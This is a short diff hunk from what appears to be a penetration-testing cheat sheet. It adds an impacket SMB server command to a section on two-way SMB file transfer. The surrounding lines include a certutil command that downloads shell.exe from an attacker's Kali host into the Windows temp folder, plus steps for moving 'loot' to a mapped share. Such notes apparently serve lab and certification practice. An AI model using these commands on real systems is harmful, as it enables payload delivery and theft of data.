@@ -888,6 +888,7 @@ certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\sh
 ````
 ### SMB Server Bi-directional
 ````
+impacket-smbserver -smb2support Share .
 smbserver.py -smb2support Share .
 mkdir loot #transfering loot to this folder
 net use * \\192.168.119.183\share
